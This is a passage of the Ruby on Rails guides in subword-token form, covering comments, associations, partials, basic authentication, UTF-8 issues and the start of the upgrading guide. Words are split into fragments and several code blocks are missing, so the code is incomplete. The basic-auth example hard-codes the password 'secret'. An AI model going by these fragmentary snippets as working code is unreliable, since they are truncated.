▁< td > <%= ▁link _ to ▁' Destroy ' , ▁article _ path ( article ),
▁method
▁ } ▁%></ td >
▁Here ▁we ' re ▁using ▁` link _ to ` ▁in ▁a ▁different ▁way .
▁We ▁pass ▁the ▁named ▁route ▁as ▁the < n > second ▁argument , ▁and ▁the n ▁the ▁options ▁as ▁another ▁argument .
▁The ▁`: method ` ▁and < n >`: ' data - co n fi rm ' ` ▁options ▁are ▁used ▁as ▁HTML 5 ▁attributes ▁so ▁that ▁when ▁the ▁link ▁is < n > click ed , ▁Rails ▁will ▁first ▁show ▁a ▁confirm ▁d i a log ▁to ▁the ▁user , ▁and ▁the n ▁submit ▁the < n > link ▁with ▁method ▁` delete `.
▁This ▁is ▁done ▁via ▁the ▁JavaScript ▁file ▁` jquery _ u js `< n > which ▁is ▁automatically ▁included ▁into ▁your ▁application ' s ▁layout < n > ( ` app / views / layouts / application . html . erb `) ▁when ▁you ▁generated ▁the ▁application . < n >
▁With out ▁this ▁file , ▁the ▁confirmation ▁d i a log ▁box ▁would n ' t ▁appear .
▁Co n fi rm ▁D i a log ]( images / getting _ started / co n fi rm _ d i a log . png )
▁Co n gr at ul ation s , ▁you ▁can ▁now ▁create , ▁show , ▁list , ▁update ▁and ▁destroy < n > articles .
▁For ▁more ▁information ▁about ▁routing , ▁see < n >[ Rails ▁ Routing ▁from ▁the ▁Ou t side ▁In ]( routing . html ).
▁ Adding ▁a ▁S ec on d ▁Model
▁It ' s ▁time ▁to ▁add ▁a ▁second ▁model ▁to ▁the ▁application .
▁The ▁second ▁model ▁will ▁handle < n > comments ▁on ▁articles .
▁### ▁Generat ing ▁a ▁Model
▁We ' re ▁going ▁to ▁see ▁the ▁same ▁generator ▁that ▁we ▁used ▁before ▁when ▁creating < n > the ▁` Article ` ▁model .
▁This ▁time ▁we ' ll ▁create ▁a ▁` Comment ` ▁model ▁to ▁hold < n > reference ▁of ▁article ▁comments .
▁Run ▁this ▁command ▁in ▁your ▁terminal :
▁This ▁command ▁will ▁generate ▁four ▁files :
▁| ▁File ▁| ▁P urpose ▁|
▁| ▁db / migrate / 20 140 1 20 20 10 10 _ create _ comments . rb ▁| ▁ Migration ▁to ▁create ▁the ▁comments ▁table ▁in ▁your ▁database ▁( your ▁name ▁will ▁include ▁a ▁different ▁timestamp ) ▁|
▁| ▁app / models / comment . rb ▁| ▁The ▁ Comment ▁model ▁|
▁| ▁test / models / comment _ test . rb ▁| ▁Testing ▁ha r n es s ▁for ▁the ▁comments ▁model ▁|
▁| ▁test / fixtures / comments . yml ▁| ▁S ample ▁comments ▁for ▁use ▁in ▁testing ▁|
▁First , ▁take ▁a ▁look ▁at ▁` app / models / comment . rb ` :
▁This ▁is ▁very ▁similar ▁to ▁the ▁` Article ` ▁model ▁that ▁you ▁saw ▁earlier .
▁The ▁difference < n > is ▁the ▁line ▁` belongs _ to ▁: article `, ▁which ▁set s ▁up ▁an ▁Active ▁Record ▁ _ association _ . < n >
▁You ' ll ▁learn ▁a ▁little ▁about ▁associations ▁in ▁the ▁next ▁section ▁of ▁this ▁guide .
▁In ▁addition ▁to ▁the ▁model , ▁Rails ▁has ▁also ▁made ▁a ▁migration ▁to ▁create ▁the < n > corresponding ▁database ▁table :
▁class ▁Create Comments ▁< ▁ActiveRecord :: Migration
▁create _ table ▁: comments ▁do ▁| t |
▁t . string ▁: comment er
▁t . text ▁: body
▁# ▁this ▁line ▁add s ▁an ▁integer ▁column ▁called ▁` article _ id `.
▁t . reference s ▁: article , ▁index : ▁true
▁The ▁` t . reference s ` ▁line ▁set s ▁up ▁a ▁foreign ▁key ▁column ▁for ▁the ▁association ▁between < n > the ▁two ▁models .
▁An ▁index ▁for ▁this ▁association ▁is ▁also ▁created ▁on ▁this ▁column . < n >
▁G o ▁a head ▁and ▁run ▁the ▁migration :
▁Rails ▁is ▁smart ▁enough ▁to ▁only ▁execute ▁the ▁migrations ▁that ▁have ▁not ▁already ▁been < n > ru n ▁again st ▁the ▁current ▁database , ▁so ▁in ▁this ▁case ▁you ▁will ▁just ▁see :
▁== ▁Create Comments : ▁migrat ing ▁= ================ ================ ================
▁-- ▁create _ table (: comments )
▁-> ▁0.0 11 5 s
▁== ▁Create Comments : ▁migrat ed ▁( 0 . 0 1 19 s ) ▁ ========== ============== ================
▁### ▁As so ci at ing ▁Model s
▁Active ▁Record ▁associations ▁let ▁you ▁easily ▁declare ▁the ▁relationship ▁between ▁two < n > models .
▁In ▁the ▁case ▁of ▁comments ▁and ▁articles , ▁you ▁could ▁write ▁out ▁the < n > relationships ▁this ▁way :
▁* ▁ Each ▁comment ▁belongs ▁to ▁one ▁article .
▁* ▁One ▁article ▁can ▁have ▁many ▁comments .
▁In ▁fact , ▁this ▁is ▁very ▁close ▁to ▁the ▁syntax ▁that ▁Rails ▁uses ▁to ▁declare ▁this < n > association .
▁You ' ve ▁already ▁seen ▁the ▁line ▁of ▁code ▁inside ▁the ▁` Comment ` ▁model < n > ( app / models / comment . rb ) ▁that ▁make s ▁each ▁comment ▁be long ▁to ▁an ▁Article :
▁You ' ll ▁need ▁to ▁edit ▁` app / models / article . rb ` ▁to ▁add ▁the ▁other ▁side ▁of ▁the < n > association :
▁These ▁two ▁declaration s ▁enable ▁a ▁good ▁bit ▁of ▁automatic ▁behavior .
▁For ▁example , ▁if < n > you ▁have ▁an ▁instance ▁variable ▁`@ article ` ▁containing ▁an ▁article , ▁you ▁can ▁retrieve < n > all ▁the ▁comments ▁ belonging ▁to ▁that ▁article ▁as ▁an ▁array ▁using < n >` @ article . comments `.
▁TIP : ▁For ▁more ▁information ▁on ▁Active ▁Record ▁associations , ▁see ▁the ▁[ Active ▁Record < n > As so ci ation s ]( association _ basic s . html ) ▁guide .
▁### ▁ Adding ▁a ▁Route ▁for ▁ Comments
▁As ▁with ▁the ▁` welcome ` ▁controller , ▁we ▁will ▁need ▁to ▁add ▁a ▁route ▁so ▁that ▁Rails < n > k now s ▁where ▁we ▁would ▁like ▁to ▁navigate ▁to ▁see ▁` comments `.
▁Open ▁up ▁the < n >` config / routes . rb ` ▁file ▁again , ▁and ▁edit ▁it ▁as ▁follows :
▁This ▁creates ▁` comments ` ▁as ▁a ▁ _ nested ▁resource _ ▁within ▁` articles `.
▁This ▁is < n > another ▁part ▁of ▁c ap t ur ing ▁the ▁h i er ar ch ical ▁relationship ▁that ▁exists ▁between < n > articles ▁and ▁comments .
▁TIP : ▁For ▁more ▁information ▁on ▁routing , ▁see ▁the ▁[ Rails ▁ Routing ]( routing . html )< n > guid e .
▁### ▁Generat ing ▁a ▁Controller
▁With ▁the ▁model ▁in ▁hand , ▁you ▁can ▁turn ▁your ▁a tt ent ion ▁to ▁creating ▁a ▁matching < n > controller .
▁A g a in , ▁we ' ll ▁use ▁the ▁same ▁generator ▁we ▁used ▁before :
▁| ▁File / D ir ec tory ▁| ▁P urpose ▁|
▁--------------- --------- ----------------
▁| ▁app / controllers / comments _ controller . rb ▁| ▁The ▁ Comments ▁controller ▁|
▁| ▁app / views / comments / ▁| ▁View s ▁of ▁the ▁controller ▁are ▁store d ▁here ▁|
▁| ▁test / controllers / comments _ controller _ test . rb ▁| ▁The ▁test ▁for ▁the ▁controller ▁|
▁| ▁app / helpers / comments _ helper . rb ▁| ▁A ▁view ▁helper ▁file ▁|
▁| ▁app / assets / javascripts / comment . js . coffee ▁| ▁CoffeeScript ▁for ▁the ▁controller ▁|
▁| ▁app / assets / stylesheets / comment . css . scss ▁| ▁C as ca d ing ▁style ▁ sheet ▁for ▁the ▁controller ▁|
▁Like ▁with ▁any ▁blog , ▁our ▁readers ▁will ▁create ▁their ▁comments ▁directly ▁after < n > read ing ▁the ▁article , ▁and ▁once ▁they ▁have ▁added ▁their ▁comment , ▁will ▁be ▁sent ▁back < n > to ▁the ▁article ▁show ▁page ▁to ▁see ▁their ▁comment ▁now ▁list ed .
▁D ue ▁to ▁this , ▁our < n >` Comments Controller ` ▁is ▁there ▁to ▁provide ▁a ▁method ▁to ▁create ▁comments ▁and ▁delete < n > s p am ▁comments ▁when ▁they ▁a r r ive .
▁So ▁first , ▁we ' ll ▁ w i re ▁up ▁the ▁Article ▁show ▁template < n > ( ` app / views / articles / show . html . erb `) ▁to ▁let ▁us ▁make ▁a ▁new ▁comment :
▁< h 2 > A d d ▁a ▁comment : </ h 2 >
▁<%= ▁form _ for ( [ @ article , ▁@ article . comments . build ]) ▁do ▁| f | ▁%>
▁<%= ▁f . label ▁: comment er ▁%>< br >
▁<%= ▁f . text _ field ▁: comment er ▁%>
▁<%= ▁f . label ▁: body ▁%>< br >
▁<%= ▁f . text _ area ▁: body ▁%>
▁This ▁add s ▁a ▁form ▁on ▁the ▁` Article ` ▁show ▁page ▁that ▁creates ▁a ▁new ▁comment ▁by < n > c all ing ▁the ▁` Comments Controller ` ▁` create ` ▁action .
▁The ▁` form _ for ` ▁call ▁here ▁uses < n > an ▁array , ▁which ▁will ▁build ▁a ▁nested ▁route , ▁such ▁as ▁` / articles /1/ comments `.
▁Let ' s ▁ w i re ▁up ▁the ▁` create ` ▁in ▁` app / controllers / comments _ controller . rb ` :
▁class ▁ Comments Controller ▁< ▁Application Controller
▁@ article ▁= ▁Article . find ( params [: article _ id ])
▁@ comment ▁= ▁@ article . comments . create ( comment _ params )
▁redirect _ to ▁article _ path (@ article )
▁def ▁comment _ params
▁params . require (: comment ). permit (: comment er , ▁: body )
▁You ' ll ▁see ▁a ▁bit ▁more ▁complex ity ▁here ▁than ▁you ▁did ▁in ▁the ▁controller ▁for < n > articles .
▁That ' s ▁a ▁side - e ffect ▁of ▁the ▁nesting ▁that ▁you ' ve ▁set ▁up .
▁ Each ▁request < n > for ▁a ▁comment ▁has ▁to ▁keep ▁track ▁of ▁the ▁article ▁to ▁which ▁the ▁comment ▁is ▁attach ed ,< n > th us ▁the ▁initial ▁call ▁to ▁the ▁` find ` ▁method ▁of ▁the ▁` Article ` ▁model ▁to ▁get ▁the < n > article ▁in ▁question .
▁In ▁addition , ▁the ▁code ▁take s ▁advantage ▁of ▁some ▁of ▁the ▁methods ▁available ▁for ▁an < n > association .
▁We ▁use ▁the ▁` create ` ▁method ▁on ▁`@ article . comments ` ▁to ▁create ▁and < n > save ▁the ▁comment .
▁This ▁will ▁automatically ▁link ▁the ▁comment ▁so ▁that ▁it ▁belongs ▁to < n > that ▁particular ▁article .
▁On ce ▁we ▁have ▁made ▁the ▁new ▁comment , ▁we ▁send ▁the ▁user ▁back ▁to ▁the ▁original ▁article < n > using ▁the ▁` article _ path (@ article )` ▁helper .
▁As ▁we ▁have ▁already ▁seen , ▁this ▁calls < n > the ▁` show ` ▁action ▁of ▁the ▁` Article sController ` ▁which ▁in ▁turn ▁render s ▁the < n >` show . html . erb ` ▁template .
▁This ▁is ▁where ▁we ▁want ▁the ▁comment ▁to ▁show , ▁so ▁let ' s < n > add ▁that ▁to ▁the ▁` app / views / articles / show . html . erb `.
▁< h 2 > Comments </ h 2 >
▁<% ▁@ article . comments . each ▁do ▁| comment | ▁%>
▁< strong > Comment er : </ strong >
▁<%= ▁comment . comment er ▁%>
▁< strong > Comment : </ strong >
▁<%= ▁comment . body ▁%>
▁Now ▁you ▁can ▁add ▁articles ▁and ▁comments ▁to ▁your ▁blog ▁and ▁have ▁them ▁show ▁up ▁in ▁the < n > right ▁place s .
▁Article ▁with ▁ Comments ]( images / getting _ started / article _ with _ comments . png )
▁Re factor ing
▁Now ▁that ▁we ▁have ▁articles ▁and ▁comments ▁working , ▁take ▁a ▁look ▁at ▁the < n >` app / views / articles / show . html . erb ` ▁template .
▁It ▁is ▁getting ▁long ▁and ▁a w k w ar d .
▁We < n > can ▁use ▁partials ▁to ▁clean ▁it ▁up .
▁### ▁Rendering ▁ Partial ▁Co ll ection s
▁First , ▁we ▁will ▁make ▁a ▁comment ▁partial ▁to ▁extract ▁show ing ▁all ▁the ▁comments ▁for < n > the ▁article .
▁< strong > Comment er : </ strong >
▁<%= ▁comment . comment er ▁%>
▁< strong > Comment : </ strong >
▁<%= ▁comment . body ▁%>
▁Then ▁you ▁can ▁change ▁` app / views / articles / show . html . erb ` ▁to ▁look ▁like ▁the < n > following :
▁This ▁will ▁now ▁render ▁the ▁partial ▁in ▁` app / views / comments / _ comment . html . erb ` ▁once < n > for ▁each ▁comment ▁that ▁is ▁in ▁the ▁`@ article . comments ` ▁collection .
▁As ▁the ▁` render `< n > method ▁iterate s ▁over ▁the ▁`@ article . comments ` ▁collection , ▁it ▁assign s ▁each < n > comment ▁to ▁a ▁local ▁variable ▁named ▁the ▁same ▁as ▁the ▁partial , ▁in ▁this ▁case < n >` comment ` ▁which ▁is ▁the n ▁available ▁in ▁the ▁partial ▁for ▁us ▁to ▁show .
▁### ▁Rendering ▁a ▁ Partial ▁For m
▁Let ▁us ▁also ▁move ▁that ▁new ▁comment ▁section ▁out ▁to ▁its ▁own ▁partial .
▁A g a in , ▁you < n > create ▁a ▁file ▁` app / views / comments / _ form . html . erb ` ▁containing :
▁Then ▁you ▁make ▁the ▁` app / views / articles / show . html . erb ` ▁look ▁like ▁the ▁following :
▁The ▁second ▁render ▁just ▁defines ▁the ▁partial ▁template ▁we ▁want ▁to ▁render ,< n >` comments / form `.
▁Rails ▁is ▁smart ▁enough ▁to ▁spot ▁the ▁forward ▁ slash ▁in ▁that < n > string ▁and ▁real ize ▁that ▁you ▁want ▁to ▁render ▁the ▁` _ form . html . erb ` ▁file ▁in < n > the ▁` app / views / comments ` ▁directory .
▁The ▁`@ article ` ▁object ▁is ▁available ▁to ▁any ▁partials ▁rendered ▁in ▁the ▁view ▁because < n > we ▁defined ▁it ▁as ▁an ▁instance ▁variable .
▁Delet ing ▁ Comments
▁A nother ▁important ▁feature ▁of ▁a ▁blog ▁is ▁being ▁able ▁to ▁delete ▁sp am ▁comments .
▁To ▁do < n > this , ▁we ▁need ▁to ▁implement ▁a ▁link ▁of ▁some ▁sort ▁in ▁the ▁view ▁and ▁a ▁` destroy `< n > action ▁in ▁the ▁` Comments Controller `.
▁So ▁first , ▁let ' s ▁add ▁the ▁delete ▁link ▁in ▁the < n >` app / views / comments / _ comment . html . erb ` ▁partial :
▁<%= ▁link _ to ▁' Destroy ▁ Comment ' , ▁[ comment . article , ▁comment ] ,
▁method : ▁: delete ,
▁data : ▁ { ▁confirm : ▁' A re ▁you ▁sure ? '
▁Click ing ▁this ▁new ▁" Destroy ▁ Comment " ▁link ▁will ▁fire ▁off ▁a ▁` DELETE < n > / articles / : article _ id / comments / : id ` ▁to ▁our ▁` Comments Controller `, ▁which ▁can ▁the n < n > use ▁this ▁to ▁find ▁the ▁comment ▁we ▁want ▁to ▁delete , ▁so ▁let ' s ▁add ▁a ▁` destroy ` ▁action < n > to ▁our ▁controller ▁( ` app / controllers / comments _ controller . rb `) :
▁@ comment ▁= ▁@ article . comments . find ( params [: id ])
▁@ comment . destroy
▁The ▁` destroy ` ▁action ▁will ▁find ▁the ▁article ▁we ▁are ▁look ing ▁at , ▁ lo c ate ▁the ▁comment < n > with in ▁the ▁`@ article . comments ` ▁collection , ▁and ▁the n ▁remove ▁it ▁from ▁the < n > database ▁and ▁send ▁us ▁back ▁to ▁the ▁show ▁action ▁for ▁the ▁article .
▁### ▁Delet ing ▁As so ci at ed ▁Object s
▁Rails ▁allows < n > you ▁to ▁use ▁the ▁` dependent ` ▁option ▁of ▁an ▁association ▁to ▁achieve ▁this .
▁Mo d ify ▁the < n > Article ▁model , ▁` app / models / article . rb `, ▁as ▁follows :
▁has _ many ▁: comments , ▁ dependent : ▁: destroy
▁### ▁B as ic ▁ Authentication
▁Rails ▁provides ▁a ▁very ▁simple ▁HTTP ▁authentication ▁system ▁that ▁will ▁work ▁nicely ▁in < n > this ▁situation .
▁ http _ basic _ authenticate _ with ▁name : ▁" d h h ", ▁password : ▁" secret ", ▁except : ▁[ : index , ▁: show ]
▁We ▁also ▁want ▁to ▁allow ▁only ▁ authenticated ▁users ▁to ▁delete ▁comments , ▁so ▁in ▁the < n >` Comments Controller ` ▁( ` app / controllers / comments _ controller . rb `) ▁we ▁write :
▁ http _ basic _ authenticate _ with ▁name : ▁" d h h ", ▁password : ▁" secret ", ▁only : ▁: destroy
▁# ▁...
▁Now ▁if ▁you ▁try ▁to ▁create ▁a ▁new ▁article , ▁you ▁will ▁be ▁g re et ed ▁with ▁a ▁basic ▁HTTP < n > Authentication ▁ cha ll en ge :
▁B as ic ▁HTTP ▁ Authentication ▁C h all en ge ]( images / getting _ started / cha ll en ge . png )
▁Other ▁authentication ▁methods ▁are ▁available ▁for ▁Rails ▁applications .
▁T w o ▁popular < n > authentication ▁add - on s ▁for ▁Rails ▁are ▁the < n >[ D evi se ]( https :// github . com / plat a format ec / devise ) ▁rails ▁engine ▁and < n > the ▁[ Auth log ic ]( https :// github . com / bin ary log ic / a u th log ic ) ▁gem ,< n > a long ▁with ▁a ▁number ▁of ▁other s .
▁### ▁Other ▁ Security ▁Consider ation s
▁ Security , ▁es pecially ▁in ▁web ▁applications , ▁is ▁a ▁broad ▁and ▁ detailed ▁are a .
▁ Security < n > in ▁your ▁Rails ▁application ▁is ▁covered ▁in ▁more ▁depth ▁in < n > the ▁[ Ruby ▁on ▁Rails ▁ Security ▁G u id e ]( security . html )
▁What ' s ▁Next ?
▁Now ▁that ▁you ' ve ▁seen ▁your ▁first ▁Rails ▁application , ▁you ▁should ▁feel ▁free ▁to < n > update ▁it ▁and ▁ ex p er i ment ▁on ▁your ▁own .
▁But ▁you ▁don ' t ▁have ▁to ▁do ▁everything < n > with out ▁help .
▁As ▁you ▁need ▁assist ance ▁getting ▁up ▁and ▁running ▁with ▁Rails , ▁feel < n > free ▁to ▁consult ▁these ▁support ▁resources :
▁* ▁The ▁[ Ruby ▁on ▁Rails ▁Tutorial ]( http :// railstutorial . org / book )
▁* ▁The ▁[ Ruby ▁on ▁Rails ▁mail ing ▁list ]( http :// groups . google . com / group / rubyonrails - t al k )
▁* ▁The ▁[ # rubyonrails ]( ir c :// ir c . free n ode . net / # rubyonrails ) ▁ cha n n el ▁on ▁ ir c . free n ode . net
▁Rails ▁also ▁comes ▁with ▁built - in ▁help ▁that ▁you ▁can ▁generate ▁using ▁the ▁rake < n > command - line ▁utility :
▁* ▁Running ▁` rake ▁ doc : guides ` ▁will ▁put ▁a ▁full ▁copy ▁of ▁the ▁Rails ▁G u id es ▁in ▁the < n > ▁` doc / guides ` ▁folder ▁of ▁your ▁application .
▁Open ▁` doc / guides / index . html ` ▁in ▁your < n > ▁web ▁browser ▁to ▁explor e ▁the ▁G u id es .
▁* ▁Running ▁` rake ▁ doc : rails ` ▁will ▁put ▁a ▁full ▁copy ▁of ▁the ▁API ▁documentation ▁for < n > ▁Rails ▁in ▁the ▁` doc / api ` ▁folder ▁of ▁your ▁application .
▁Open ▁` doc / api / index . html `< n > ▁in ▁your ▁web ▁browser ▁to ▁explor e ▁the ▁API ▁documentation .
▁Add ▁it ▁to ▁your ▁` Gemfile ` ▁and ▁run < n >` bundle ▁install ` ▁and ▁you ' re ▁ready ▁to ▁go .
▁Configuration ▁G o t cha s
▁The ▁easie st ▁way ▁to ▁work ▁with ▁Rails ▁is ▁to ▁store ▁all ▁external ▁data ▁as ▁ UT F -8 .
▁If < n > you ▁don ' t , ▁Ruby ▁libraries ▁and ▁Rails ▁will ▁often ▁be ▁able ▁to ▁convert ▁your ▁native < n > data ▁into ▁ UT F -8 , ▁but ▁this ▁does n ' t ▁always ▁work ▁re li ably , ▁so ▁you ' re ▁better ▁off < n > en s ur ing ▁that ▁all ▁external ▁data ▁is ▁ UT F -8 .
▁If ▁you ▁have ▁made ▁a ▁mistake ▁in ▁this ▁are a , ▁the ▁most ▁common ▁ s y mp to m ▁is ▁a ▁b la c k < n > d i am on d ▁with ▁a ▁question ▁mark ▁inside ▁appear ing ▁in ▁the ▁browser .
▁A nother ▁common < n > s y mp to m ▁is ▁characters ▁like ▁" Ã 1 ⁄ 4 " ▁appear ing ▁instead ▁of ▁" ü ".
▁Rails ▁take s ▁a ▁number < n > of ▁internal ▁steps ▁to ▁m it ig ate ▁common ▁cause s ▁of ▁these ▁problem s ▁that ▁can ▁be < n > a utomatically ▁detect ed ▁and ▁correct ed .
▁However , ▁if ▁you ▁have ▁external ▁data ▁that ▁is < n > not ▁store d ▁as ▁ UT F -8 , ▁it ▁can ▁ o cc as ion ally ▁result ▁in ▁these ▁kind s ▁of ▁issues ▁that < n > cannot ▁be ▁automatically ▁detect ed ▁by ▁Rails ▁and ▁correct ed .
▁T w o ▁very ▁common ▁source s ▁of ▁data ▁that ▁are ▁not ▁ UT F -8 :
▁* ▁Your ▁text ▁editor : ▁ Most ▁text ▁editor s ▁( such ▁as ▁ TextMate ), ▁default ▁to ▁saving < n > ▁files ▁as ▁ UT F -8 .
▁If ▁your ▁text ▁editor ▁does ▁not , ▁this ▁can ▁result ▁in ▁special < n > ▁characters ▁that ▁you ▁enter ▁in ▁your ▁templates ▁( such ▁as ▁ é ) ▁to ▁appear ▁as ▁a ▁d i am on d < n > ▁with ▁a ▁question ▁mark ▁inside ▁in ▁the ▁browser .
▁This ▁also ▁applies ▁to ▁your ▁i 18 n < n > ▁tr an s l ation ▁files .
▁ Most ▁editor s ▁that ▁do ▁not ▁already ▁default ▁to ▁ UT F -8 ▁( such ▁as < n > ▁some ▁versions ▁of ▁D re am we a ve r ) ▁offer ▁a ▁way ▁to ▁change ▁the ▁default ▁to ▁ UT F -8 .
▁Do < n > ▁so .
▁* ▁Your ▁database : ▁Rails ▁defaults ▁to ▁convert ing ▁data ▁from ▁your ▁database ▁into ▁ UT F -8 < n > ▁at ▁the ▁b ound ary .
▁However , ▁if ▁your ▁database ▁is ▁not ▁using ▁ UT F -8 ▁internally , ▁it < n > ▁may ▁not ▁be ▁able ▁to ▁store ▁all ▁characters ▁that ▁your ▁users ▁enter .
▁For ▁instance ,< n > ▁if ▁your ▁database ▁is ▁using ▁L at in - 1 ▁internally , ▁and ▁your ▁user ▁enter s ▁a ▁R us s i an ,< n > ▁H e brew , ▁or ▁ J ap an es e ▁character , ▁the ▁data ▁will ▁be ▁lost ▁for ever ▁once ▁it ▁enter s < n > ▁the ▁database .
▁If ▁possible , ▁use ▁ UT F -8 ▁as ▁the ▁internal ▁storage ▁of ▁your ▁database .
▁A ▁G u id e ▁for ▁U pgrading ▁Ruby ▁on ▁Rails
▁== ================ = ================
▁This ▁guide ▁provides ▁steps ▁to ▁be ▁followed ▁when ▁you ▁upgrade ▁your ▁applications ▁to ▁a ▁new er ▁version ▁of ▁Ruby ▁on ▁Rails .
▁These ▁steps ▁are ▁also ▁available ▁in ▁individual ▁release ▁guide s .
▁General ▁A d v ic e
▁Before ▁attempt ing ▁to ▁upgrade ▁an ▁existing ▁application , ▁you ▁should ▁be ▁sure ▁you ▁have ▁a ▁good ▁reason ▁to ▁upgrade .
▁You ▁need ▁to ▁b al ance ▁sever al ▁factor s : ▁the ▁need ▁for ▁new ▁features , ▁the ▁increasing ▁difficult y ▁of ▁find ing ▁support ▁for ▁old ▁code , ▁and ▁your ▁available ▁time ▁and ▁ skills , ▁to ▁name ▁a ▁few .
▁### ▁ Test ▁Co verage
▁The ▁best ▁way ▁to ▁be ▁sure ▁that ▁your ▁application ▁ still ▁works ▁after ▁upgrading ▁is ▁to ▁have ▁good ▁test ▁cover age ▁before ▁you ▁start ▁the ▁process .
▁If ▁you ▁don ' t ▁have ▁automate d ▁tests ▁that ▁exercise ▁the ▁b ul k ▁of ▁your ▁application , ▁you ' ll ▁need ▁to ▁sp end ▁time ▁manually ▁ ex er ci s ing ▁all ▁the ▁parts ▁that ▁have ▁changed .
▁In ▁the ▁case ▁of ▁a ▁Rails ▁upgrade , ▁that ▁will ▁mean ▁every ▁single ▁piece ▁of ▁functionality ▁in ▁the ▁application .
▁Do ▁yourself ▁a ▁favor ▁and ▁make ▁sure ▁your ▁test ▁cover age ▁is ▁good ▁ _ before _ ▁you ▁start ▁an ▁upgrade .
▁### ▁Ruby ▁ Version s
▁Rails ▁generally ▁sta y s ▁close ▁to ▁the ▁latest ▁release d ▁Ruby ▁version ▁when ▁it ' s ▁release d :
▁* ▁Rails ▁3 ▁and ▁above ▁require ▁Ruby ▁1. 8 . 7 ▁or ▁high er .
▁Support ▁for ▁all ▁of ▁the ▁previous ▁Ruby ▁versions ▁has ▁been ▁ drop ped ▁of fi cial ly .
▁You ▁should ▁upgrade ▁as ▁ early ▁as ▁possible .
▁* ▁Rails ▁3.2 . x ▁is ▁the ▁last ▁branch ▁to ▁support ▁Ruby ▁1. 8 . 7 .
▁* ▁Rails ▁4 ▁prefer s ▁Ruby ▁2 . 0 ▁and ▁requires ▁ 1.9.3 ▁or ▁new er .
▁TIP : ▁Ruby ▁1. 8 . 7 ▁p 2 4 8 ▁and ▁p 2 4 9 ▁have ▁m ar s h al ing ▁bug s ▁that ▁c ra s h ▁Rails .
▁Ruby ▁E nterprise ▁ Edit ion ▁has ▁these ▁ fixed ▁since ▁the ▁release ▁of ▁1. 8 . 7 - 20 10 . 02 .
▁On ▁the ▁1.9 ▁front , ▁Ruby ▁1.9 . 1 ▁is ▁not ▁us able ▁because ▁it ▁out right ▁ s eg fa ul t s , ▁so ▁if ▁you ▁want ▁to ▁use ▁1.9 . x , ▁jump ▁ str a ight ▁to ▁ 1.9.3 ▁for ▁ s m oo th ▁ s ailing .
▁### ▁The ▁Rake ▁T as k
▁Rails ▁provides ▁the ▁` rails : update ` ▁rake ▁task .
▁After ▁updating ▁the ▁Rails ▁version < n > in ▁the ▁Gemfile , ▁run ▁this ▁rake ▁task .
▁This ▁will ▁help ▁you ▁with ▁the ▁creation ▁of ▁new ▁files ▁and ▁changes ▁of ▁old ▁files ▁in ▁an < n > in ter active ▁session .
▁ $ ▁rake ▁rails : update
▁identical ▁config / b oo t . rb
▁exist ▁config
▁con f li c t ▁config / routes . rb
▁Over write ▁/ my app / config / routes . rb ?
▁( ent er ▁" h " ▁for ▁help ) ▁[ Y n a q d h ]
▁force ▁config / routes . rb
▁con f li c t ▁config / application . rb
▁Over write ▁/ my app / config / application . rb ?
▁force ▁config / application . rb
▁con f li c t ▁config / environment . rb
▁Do n ' t ▁ forget ▁to ▁review ▁the ▁difference , ▁to ▁see ▁if ▁there ▁were ▁any ▁un expected ▁changes .
▁U pgrading ▁from ▁Rails ▁4.1 ▁to ▁Rails ▁4 . 2
▁### ▁Web ▁Co n so le
▁First , ▁add ▁` gem ▁' web - console ' , ▁' ~ > ▁2 . 0 ' ` ▁to ▁the ▁`: development ` ▁group ▁in ▁your ▁Gemfile ▁and ▁run ▁` bundle ▁install ` ▁( it ▁won ' t ▁have ▁been ▁included ▁when ▁you ▁upgrade d ▁Rails ).
▁On ce ▁it ' s ▁been ▁installed , ▁you ▁can ▁simply ▁ drop ▁a ▁reference ▁to ▁the ▁console ▁helper ▁( i . e . , ▁` <%= ▁console ▁%> `) ▁into ▁any ▁view ▁you ▁want ▁to ▁enable ▁it ▁for .
▁A ▁console ▁will ▁also ▁be ▁provided ▁on ▁any ▁error ▁page ▁you ▁view ▁in ▁your ▁development ▁environment .
▁### ▁Re s p on d ers
▁` respond _ with ` ▁and ▁the ▁class - level ▁` respond _ to ` ▁methods ▁have ▁been ▁extract ed ▁to ▁the ▁` respond ers ` ▁gem .
▁To ▁use ▁them , ▁simply ▁add ▁` gem ▁' respond ers ' , ▁' ~ > ▁2 . 0 ' ` ▁to ▁your ▁Gemfile .
▁Call s ▁to ▁` respond _ with ` ▁and ▁` respond _ to ` ▁( a g a in , ▁at ▁the ▁class ▁level ) ▁will ▁no ▁longer ▁work ▁without ▁ having ▁included ▁the ▁` respond ers ` ▁gem ▁in ▁your ▁dependencies :
▁# ▁app / controllers / users _ controller . rb
▁respond _ to ▁: html , ▁: json
▁def ▁show
▁@ user ▁= ▁User . find ( params [: id ])
▁respond _ with ▁@ user
▁In st ance - level ▁` respond _ to ` ▁is ▁un a ffect ed ▁and ▁does ▁not ▁require ▁the ▁ additional ▁gem :
▁format . html
▁format . json ▁ { ▁render ▁ json : ▁@ user ▁ }
▁See ▁[ # 16 5 2 6 ]( https :// github . com / rails / rails / pull / 16 5 2 6 ) ▁for ▁more ▁details .
▁### ▁ Error ▁handling ▁in ▁ transaction ▁callbacks
▁Currently , ▁Active ▁Record ▁suppress es ▁errors ▁raised < n > with in ▁` after _ rollback ` ▁or ▁` after _ commit ` ▁callbacks ▁and ▁only ▁ print s ▁them ▁to < n > the ▁log s .
▁In ▁the ▁next ▁version , ▁these ▁errors ▁will ▁no ▁longer ▁be ▁suppress ed .
▁Instead , ▁the ▁errors ▁will ▁pro p a g ate ▁normally ▁just ▁like ▁in ▁other ▁Active < n > Record ▁callbacks .
▁When ▁you ▁define ▁a ▁` after _ rollback ` ▁or ▁` after _ commit ` ▁callback , ▁you < n > will ▁receive ▁a ▁deprecation ▁warning ▁about ▁this ▁up com ing ▁change .
▁When < n > you ▁are ▁ready , ▁you ▁can ▁opt ▁into ▁the ▁new ▁behavior ▁and ▁remove ▁the < n > d eprecation ▁warning ▁by ▁adding ▁following ▁configuration ▁to ▁your < n >` config / application . rb ` :
▁config . active _ record . raise _ in _ transaction al _ callback s ▁= ▁true
▁See ▁[ # 1 44 88 ]( https :// github . com / rails / rails / pull /1 44 88 ) ▁and < n >[ # 16 5 37 ]( https :// github . com / rails / rails / pull / 16 5 37 ) ▁for ▁more ▁details .
▁### ▁ Order ing ▁of ▁test ▁cases
▁In ▁Rails ▁ 5.0 , ▁test ▁cases ▁will ▁be ▁executed ▁in ▁random ▁order ▁by ▁default .
